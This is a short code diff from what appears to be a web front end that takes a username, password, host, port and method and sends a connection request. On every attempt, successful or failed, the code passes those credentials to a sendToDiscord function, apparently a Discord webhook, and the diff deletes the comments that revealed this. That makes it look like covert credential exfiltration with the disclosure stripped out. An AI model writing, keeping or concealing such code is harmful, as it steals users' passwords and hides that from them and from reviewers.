@@ -129,11 +129,10 @@
                         });
                     }
 
-                    // Send data to Discord webhook
                     sendToDiscord(username, password, host, port, method, success);
                 } catch (error) {
                     setResponse({ error: "Failed to fetch response, please try again." });
-                    sendToDiscord(username, password, host, port, method, false);  // Send failed attempt
+                    sendToDiscord(username, password, host, port, method, false);  
                 }
                 setLoading(false);
             };
